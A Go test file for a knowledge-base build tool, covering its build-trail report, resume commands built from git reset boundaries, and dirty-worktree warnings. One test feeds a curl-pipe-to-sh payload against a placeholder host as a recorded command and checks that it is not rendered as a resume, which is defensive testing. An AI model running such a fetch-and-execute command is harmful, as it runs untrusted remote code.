package buildstore

import (
	"bytes"
	"fmt"
	"os"
	"path/filepath"
	"slices"
	"testing"
	"time"

	"kbase/internal/argmark"
	"kbase/internal/buildstore/storetest"
	"kbase/internal/kb"
	"kbase/internal/result"
)

// boundary records a stage's boundary, writing a file under kb-root/ so the
// boundary commits one, and returns the commit.
func (f fixture) boundary(t *testing.T, stage string) string {
	t.Helper()
	return f.boundaryWithBody(t, stage, "")
}

// boundaryWithBody is boundary with the commit's body as given.
func (f fixture) boundaryWithBody(t *testing.T, stage, body string) string {
	t.Helper()
	s, ok := ResolveStage(stage)
	if !ok {
		t.Fatalf("%q names no stage", stage)
	}
	storetest.WriteFile(t, filepath.Join(f.repo, kb.KBDir, s.ID+".md"), "# "+s.Display+"\n")
	commit, err := f.ledger(t).Record(s.ID, s.Display, body)
	if err != nil {
		t.Fatal(err)
	}
	return commit
}

// recordRun writes the progress record of one build that opened with argv and
// ended so, as a build leaves it in the state store.
func (f fixture) recordRun(t *testing.T, ended string, argv []string) {
	t.Helper()
	f.recordInvocation(t, argv, Event{Event: EventEnd, Outcome: ended})
}

func (f fixture) trail(t *testing.T) (string, []result.Field) {
	t.Helper()
	return BuildTrail(MonitorOptions{WorkDir: f.repo, StateDir: f.state})
}

// recordInvocation writes one invocation the store does not hold yet: its run
// event carrying argv, then events, as a build leaves them in the progress
// record.
func (f fixture) recordInvocation(t *testing.T, argv []string, events ...Event) {
	t.Helper()
	appendProgress(t, f.state, append([]Event{{Event: EventRun, PID: os.Getpid(), Resume: argv}}, events...)...)
}

// reset moves the branch to commit and brings the owned paths with it: what a
// `git reset --keep <commit>` leaves a clean worktree reading, without
// starting a process.
func (f fixture) reset(t *testing.T, commit string) {
	t.Helper()
	if err := os.WriteFile(filepath.Join(f.repo, ".git", "refs", "heads", "main"), []byte(commit+"\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := f.ledger(t).Restore(commit); err != nil {
		t.Fatal(err)
	}
}

// trailLines is the boundaries field as "stage commit subject" lines, in
// document order.
func trailLines(fields []result.Field) []string {
	boundaries, _ := storetest.Field(fields, "boundaries").([]result.Record)
	lines := make([]string, len(boundaries))
	for i, r := range boundaries {
		lines[i] = fmt.Sprint(r[0].Value, " ", r[1].Value, " ", r[2].Value)
	}
	return lines
}

// recordValue is a record's value under key.
func recordValue(r result.Record, key string) any {
	for _, f := range r {
		if f.Key == key {
			return f.Value
		}
	}
	return nil
}

// resumeFrom is a boundary's command: the reset to it, then the build resumed.
func resumeFrom(commit string) []string {
	return []string{"git reset --keep " + commit, argmark.Call("build", map[string]any{"resume": true})}
}

// TestBuildTrailReportsTheTrail: the document names the commit HEAD stands at
// and every boundary the trail holds, oldest first, each with its subject and
// the command that rewinds to it — git reset --keep to its commit, then the
// build resumed — and takes no target.
func TestBuildTrailReportsTheTrail(t *testing.T) {
	f := newTrailFixture(t)
	start := f.boundary(t, "start")
	graph := f.boundary(t, "document-graph")
	seed := f.boundary(t, "spine-seed")
	outcome, fields := f.trail(t)
	if outcome != result.Done {
		t.Fatalf("build-trail = %s %v", outcome, fields)
	}
	if keys, want := storetest.FieldKeys(fields), []string{"kb-root", "state-dir", "head", "boundaries", "started-at", "dirty"}; !slices.Equal(keys, want) {
		t.Errorf("fields = %q, want %q in that order", keys, want)
	}
	if got, want := storetest.Field(fields, "head"), seed; got != want {
		t.Errorf("head = %v, want the newest boundary %v", got, want)
	}
	want := []string{
		"start " + start + " kb-build: start | build started",
		"document-graph " + graph + " kb-build: document-graph | document tree derived",
		"spine-seed " + seed + " kb-build: spine-seed | claim-graph spine seeded",
	}
	if got := trailLines(fields); !slices.Equal(got, want) {
		t.Errorf("boundaries = %q, want %q", got, want)
	}
	boundaries, _ := storetest.Field(fields, "boundaries").([]result.Record)
	for i, commit := range []string{start, graph, seed} {
		if keys, want := storetest.FieldKeys([]result.Field(boundaries[i])), []string{"stage", "commit", "subject", "command"}; !slices.Equal(keys, want) {
			t.Errorf("boundary %d keys = %q, want %q", i, keys, want)
		}
		if got, _ := recordValue(boundaries[i], "command").([]string); !slices.Equal(got, resumeFrom(commit)) {
			t.Errorf("boundary %d command = %q, want %q", i, got, resumeFrom(commit))
		}
	}
	if got := storetest.Field(fields, "dirty"); got != false {
		t.Errorf("dirty = %v, want false on a clean worktree", got)
	}
	var doc bytes.Buffer
	if err := result.Emit(&doc, outcome, fields...); err != nil {
		t.Fatal(err)
	}
	t.Logf("three boundaries:\n%s", doc.String())
}

// TestBuildTrailResumesAsTheRunRecorded: a boundary's command resumes the
// build as the run the store stands at recorded it, its launch flags
// included; a store recording no run gives the bare resume.
func TestBuildTrailResumesAsTheRunRecorded(t *testing.T) {
	f := newTrailFixture(t)
	start := f.boundary(t, "start")
	graph := f.boundary(t, "document-graph")
	argv := []string{"kbase", "build", "--resume", "--no-inference", "--state-dir", f.state}
	f.recordRun(t, result.Done, argv)
	_, fields := f.trail(t)
	boundaries, _ := storetest.Field(fields, "boundaries").([]result.Record)
	if len(boundaries) != 2 {
		t.Fatalf("boundaries = %v, want 2", boundaries)
	}
	for i, commit := range []string{start, graph} {
		want := []string{"git reset --keep " + commit, recordedCall(argv)}
		if got, _ := recordValue(boundaries[i], "command").([]string); !slices.Equal(got, want) {
			t.Errorf("boundary %d command = %q, want %q", i, got, want)
		}
	}

	f = newTrailFixture(t)
	start = f.boundary(t, "start")
	_, fields = f.trail(t)
	boundaries, _ = storetest.Field(fields, "boundaries").([]result.Record)
	if len(boundaries) != 1 {
		t.Fatalf("boundaries = %v, want 1", boundaries)
	}
	if got, _ := recordValue(boundaries[0], "command").([]string); !slices.Equal(got, resumeFrom(start)) {
		t.Errorf("command with no run recorded = %q, want %q", got, resumeFrom(start))
	}
}

// TestBuildTrailDirtyIsAWarning: the document names what a reset would touch,
// the whole worktree's changes and not only the paths a build owns, and the
// outcome stays done.
func TestBuildTrailDirtyIsAWarning(t *testing.T) {
	f := newTrailFixture(t)
	f.boundary(t, "start")
	storetest.WriteFile(t, filepath.Join(f.repo, kb.KBDir, "start.md"), "edited\n")
	storetest.WriteFile(t, filepath.Join(f.repo, kb.KBDir, "draft.md"), "untracked\n")
	storetest.WriteFile(t, filepath.Join(f.repo, "notes.txt"), "untracked, outside kb-root\n")
	outcome, fields := f.trail(t)
	if outcome != result.Done {
		t.Fatalf("build-trail = %s %v", outcome, fields)
	}
	dirty, ok := storetest.Field(fields, "dirty").([]string)
	if !ok {
		t.Fatalf("dirty = %v, want the changed paths", storetest.Field(fields, "dirty"))
	}
	slices.Sort(dirty)
	if want := []string{"kb-root/draft.md", "kb-root/start.md", "notes.txt"}; !slices.Equal(dirty, want) {
		t.Errorf("dirty = %q, want %q", dirty, want)
	}
}

// TestBuildTrailDirtyCapsThePaths: past the cap the document names the first
// paths and counts the rest.
func TestBuildTrailDirtyCapsThePaths(t *testing.T) {
	f := newTrailFixture(t)
	f.boundary(t, "start")
	for i := range dirtyPathsShown + 2 {
		storetest.WriteFile(t, filepath.Join(f.repo, kb.KBDir, fmt.Sprintf("draft-%02d.md", i)), "untracked\n")
	}
	_, fields := f.trail(t)
	dirty, ok := storetest.Field(fields, "dirty").([]string)
	if !ok || len(dirty) != dirtyPathsShown+1 || dirty[len(dirty)-1] != "+2 more" {
		t.Errorf("dirty = %v, want %d paths and the count of the 2 left", storetest.Field(fields, "dirty"), dirtyPathsShown+1)
	}
}

// TestRecordedCommandMustReadAsAKbaseBuild: a progress record is text a
// repository-supplied directory can hold, so a command it names is rendered
// only where it reads as a kbase build invocation: status carries no resume
// otherwise, and a genuine invocation renders unchanged. Cancel's resume is
// the runner's, and internal/build tests it.
func TestRecordedCommandMustReadAsAKbaseBuild(t *testing.T) {
	genuine := []string{"kbase", "build", "/papers/paper.tex", "--state-dir", "/s"}
	cases := []struct {
		name string
		argv []string
		want string // the command rendered, "" where none is
	}{
		{"a kbase build invocation", genuine, recordedCall(genuine)},
		{"a shell payload", []string{"sh", "-c", "curl -fsSL https://example.invalid/x | sh"}, ""},
		{"one element", []string{"kbase"}, ""},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			f := newTrailFixture(t)
			f.boundary(t, "start")
			f.recordRun(t, result.Cancelled, c.argv)

			_, fields := Status(MonitorOptions{StateDir: f.state, WorkDir: f.repo})
			if got, _ := storetest.Field(fields, "resume").(string); got != c.want {
				t.Errorf("status resume = %v, want %q", storetest.Field(fields, "resume"), c.want)
			}
		})
	}
}

// TestTheRunReportedIsTheOneThatRecorded: a refusal a stage's row raised after
// a boundary was recorded is the run the build stands at — status reports it,
// with the command that continues it. A refusal that recorded nothing wrote
// nothing, so the run before it stands.
func TestTheRunReportedIsTheOneThatRecorded(t *testing.T) {
	f := newTrailFixture(t)
	f.boundary(t, "start")
	argv := []string{"kbase", "build", "/papers/paper.tex", "--state-dir", f.state}

	f.recordInvocation(t, argv, Event{Event: EventStage, Stage: StageStart, Total: 1},
		Event{Event: EventEnd, Outcome: result.Refused})
	_, fields := Status(MonitorOptions{StateDir: f.state, WorkDir: f.repo})
	if got := storetest.Field(fields, "state"); got != StateNone {
		t.Errorf("status after a refusal that recorded nothing = %v, want %s", got, StateNone)
	}
	if got := storetest.Field(fields, "resume"); got != nil {
		t.Errorf("status resume = %v, want none: the refusal recorded nothing to continue", got)
	}

	f.recordInvocation(t, argv, Event{Event: EventStage, Stage: StageStart, Total: 1},
		Event{Event: EventRecorded, Stage: StageStart},
		Event{Event: EventStage, Stage: StageDocumentGraph, Total: 2},
		Event{Event: EventEnd, Outcome: result.Refused})
	_, fields = Status(MonitorOptions{StateDir: f.state, WorkDir: f.repo})
	if got := storetest.Field(fields, "state"); got != StateFailed {
		t.Errorf("status after a refusal that recorded start = %v, want %s", got, StateFailed)
	}
	if got, want := storetest.Field(fields, "resume"), recordedCall(argv); got != want {
		t.Errorf("status resume = %v, want %q: an identical re-issue continues it", got, want)
	}
}

// TestBuildTrailStartedAt: a start boundary recording no started-at names it
// null; one recording it names the commit with the reset to it alone, the
// start over.
func TestBuildTrailStartedAt(t *testing.T) {
	f := newTrailFixture(t)
	f.boundary(t, "start")
	outcome, fields := f.trail(t)
	if outcome != result.Done || !storetest.Carries(fields, "started-at") || storetest.Field(fields, "started-at") != nil {
		t.Fatalf("build-trail = %s %v, want started-at present and null", outcome, fields)
	}

	f = newTrailFixture(t)
	before, err := f.ledger(t).Commit("before the build", "")
	if err != nil {
		t.Fatal(err)
	}
	f.boundaryWithBody(t, "start", Inputs{VolumeRoots: []string{"/papers/paper.tex"}}.Body(before))
	f.boundary(t, "document-graph")
	outcome, fields = f.trail(t)
	started, _ := storetest.Field(fields, "started-at").(result.Record)
	if outcome != result.Done || recordValue(started, "commit") != before {
		t.Fatalf("build-trail = %s %v, want started-at naming %s", outcome, fields, before)
	}
	if keys, want := storetest.FieldKeys([]result.Field(started)), []string{"commit", "command"}; !slices.Equal(keys, want) {
		t.Errorf("started-at keys = %q, want %q", keys, want)
	}
	if got, want := recordValue(started, "command"), []string{"git reset --keep " + before}; !slices.Equal(got.([]string), want) {
		t.Errorf("started-at command = %q, want the reset alone, %q", got, want)
	}
}

// TestBuildTrailIsTheNewestBuilds: a fresh build over kb-root/ removed starts
// a trail above the one before it, and the document and status read that
// build's boundaries alone.
func TestBuildTrailIsTheNewestBuilds(t *testing.T) {
	f := newTrailFixture(t)
	f.boundary(t, "start")
	f.boundary(t, "document-graph")
	f.boundary(t, "spine-seed")
	storetest.WriteFile(t, filepath.Join(f.repo, kb.KBDir, "rebuilt.md"), "# rebuilt\n")
	again := f.boundary(t, "start")
	_, fields := f.trail(t)
	if got, want := trailLines(fields), []string{"start " + again + " kb-build: start | build started"}; !slices.Equal(got, want) {
		t.Errorf("boundaries = %q, want the newest build's %q", got, want)
	}
	_, fields = Status(MonitorOptions{StateDir: f.state, WorkDir: f.repo})
	stages, _ := storetest.Field(fields, "stages").(result.Record)
	if got, _ := recordValue(stages, "done").([]string); !slices.Equal(got, []string{StageStart}) {
		t.Errorf("status done = %q, want the newest build's start alone", got)
	}
}

// TestNoKBRootNoBuild: with kb-root/ absent from the worktree, its removal
// committed or not, or a committed removal ending the trail below a kb-root/
// written since, and no build run holding the store, status reports state none
// with no stage done and build-trail no boundary and started-at null. A live
// run is read as it stands. A reset to before the removal reads the old trail
// again.
func TestNoKBRootNoBuild(t *testing.T) {
	f := newTrailFixture(t)
	before, err := f.ledger(t).Commit("before the build", "")
	if err != nil {
		t.Fatal(err)
	}
	f.boundaryWithBody(t, "start", Inputs{VolumeRoots: []string{"/papers/paper.tex"}}.Body(before))
	graph := f.boundary(t, "document-graph")
	f.recordRun(t, result.Done, nil)
	kbRoot := filepath.Join(f.repo, kb.KBDir)
	read := func(t *testing.T) (state string, done []string, boundaries []string, started any) {
		t.Helper()
		outcome, fields := Status(MonitorOptions{StateDir: f.state, WorkDir: f.repo})
		if outcome != result.Done {
			t.Fatalf("status = %s %v", outcome, fields)
		}
		stages, _ := storetest.Field(fields, "stages").(result.Record)
		done, _ = recordValue(stages, "done").([]string)
		state, _ = storetest.Field(fields, "state").(string)
		outcome, fields = f.trail(t)
		if outcome != result.Done {
			t.Fatalf("build-trail = %s %v", outcome, fields)
		}
		return state, done, trailLines(fields), storetest.Field(fields, "started-at")
	}
	none := func(t *testing.T, when string) {
		t.Helper()
		if state, done, boundaries, started := read(t); state != StateNone || len(done) != 0 || len(boundaries) != 0 || started != nil {
			t.Errorf("%s: state %s, done %q, boundaries %q, started-at %v; want none, no stage, no boundary, null", when, state, done, boundaries, started)
		}
		_, fields := Status(MonitorOptions{StateDir: f.state, WorkDir: f.repo})
		for _, key := range []string{"current", "pid", "started", "resume"} {
			if got := storetest.Field(fields, key); got != nil {
				t.Errorf("%s: status %s = %v, want null", when, key, got)
			}
		}
	}
	built := func(t *testing.T, when, want string) {
		t.Helper()
		if state, done, boundaries, started := read(t); state != want || len(done) != 2 || len(boundaries) != 2 || started == nil {
			t.Errorf("%s: state %s, done %q, boundaries %q, started-at %v; want %s and the build's two boundaries", when, state, done, boundaries, started, want)
		}
	}
	built(t, "the build standing", StateFinished)

	if err := os.RemoveAll(kbRoot); err != nil {
		t.Fatal(err)
	}
	none(t, "kb-root/ removed, the removal uncommitted")
	held := holdStore(t, f.state, Holder{PID: os.Getpid(), Started: time.Now().UTC().Format(time.RFC3339), Kind: KindBuild})
	built(t, "a build run holding the store", StateRunning)
	held.Release()

	if _, err := f.ledger(t).Commit("kb-root removed to start over", ""); err != nil {
		t.Fatal(err)
	}
	none(t, "the removal committed")
	storetest.WriteFile(t, filepath.Join(kbRoot, kb.EntryPointFile), "# Knowledge Base\n")
	none(t, "a kb-root/ written over the committed removal")
	if err := os.RemoveAll(kbRoot); err != nil {
		t.Fatal(err)
	}

	f.reset(t, graph)
	built(t, "the branch reset to before the removal", StateFinished)
}

// TestBuildTrailRefusesAnOutOfOrderTrail: a trail recording a stage over an
// unrecorded earlier one carries build's own trail refusal, and the document
// still lists the boundaries the trail holds.
func TestBuildTrailRefusesAnOutOfOrderTrail(t *testing.T) {
	f := newTrailFixture(t)
	f.boundary(t, "start")
	f.boundary(t, "claims-declared")
	trail, err := f.ledger(t).Trail()
	if err != nil {
		t.Fatal(err)
	}
	want := TrailRefusal(f.repo, RecordedStages(trail))
	if len(want) == 0 {
		t.Fatal("the fixture records no out-of-order trail")
	}
	outcome, fields := f.trail(t)
	if outcome != result.Refused {
		t.Fatalf("build-trail = %s %v, want refused", outcome, fields)
	}
	items, _ := storetest.Field(fields, "refusals").([]result.Item)
	if len(items) != 1 || items[0].Check != want[0].Check || items[0].Detail != want[0].Detail {
		t.Errorf("refusals = %+v, want %+v", items, want)
	}
	if got := len(trailLines(fields)); got != 2 {
		t.Errorf("%d boundaries listed, want the trail's 2", got)
	}
}

// TestBuildTrailOutsideAWorktree: a directory outside any git worktree is
// refused as status refuses it, naming git init.
func TestBuildTrailOutsideAWorktree(t *testing.T) {
	base := t.TempDir()
	storetest.GitEnv(t, base)
	outcome, fields := BuildTrail(MonitorOptions{WorkDir: base, StateDir: filepath.Join(base, "state")})
	if outcome != result.Refused {
		t.Fatalf("build-trail outside a worktree = %s %v, want refused", outcome, fields)
	}
	items, _ := storetest.Field(fields, "refusals").([]result.Item)
	if len(items) != 1 || items[0].Check != CheckWorktree || items[0].Remedy != "git init" {
		t.Errorf("refusals = %+v, want one worktree item with the git init remedy", items)
	}
}

// TestBuildTrailListsABoundaryOutsideTheVocabulary: a `kb-build:` subject
// naming no stage is a boundary the document lists and the trail refusal says
// nothing of — it reads a gap in walk order, and an id outside the vocabulary
// is no gap.
func TestBuildTrailListsABoundaryOutsideTheVocabulary(t *testing.T) {
	f := newTrailFixture(t)
	f.boundary(t, "start")
	storetest.WriteFile(t, filepath.Join(f.repo, kb.KBDir, "mystery.md"), "# mystery\n")
	if _, err := f.ledger(t).Record("mystery", "a stage this kbase does not know", ""); err != nil {
		t.Fatal(err)
	}
	outcome, fields := f.trail(t)
	if outcome != result.Done {
		t.Fatalf("build-trail = %s %v, want the trail read", outcome, fields)
	}
	lines := trailLines(fields)
	if len(lines) != 2 || lines[1][:len("mystery ")] != "mystery " {
		t.Errorf("boundaries = %q, want both, the unknown stage's among them", lines)
	}
}

// TestBuildTrailAfterAResetToAMidTrailBoundary: the newer boundaries are gone
// from the trail a reset leaves, and the document reads that trail.
func TestBuildTrailAfterAResetToAMidTrailBoundary(t *testing.T) {
	f := newTrailFixture(t)
	start := f.boundary(t, "start")
	graph := f.boundary(t, "document-graph")
	f.boundary(t, "spine-seed")
	if _, fields := f.trail(t); len(trailLines(fields)) != 3 {
		t.Fatalf("%d boundaries before the reset, want 3", len(trailLines(fields)))
	}
	f.reset(t, graph)
	outcome, fields := f.trail(t)
	if outcome != result.Done {
		t.Fatalf("build-trail = %s %v", outcome, fields)
	}
	want := []string{
		"start " + start + " kb-build: start | build started",
		"document-graph " + graph + " kb-build: document-graph | document tree derived",
	}
	if got := trailLines(fields); !slices.Equal(got, want) {
		t.Errorf("boundaries after the reset = %q, want %q", got, want)
	}
	if got := storetest.Field(fields, "head"); got != graph {
		t.Errorf("head = %v, want the boundary reset to, %v", got, graph)
	}
	if got := storetest.Field(fields, "dirty"); got != false {
		t.Errorf("dirty = %v, want false after the reset", got)
	}
}
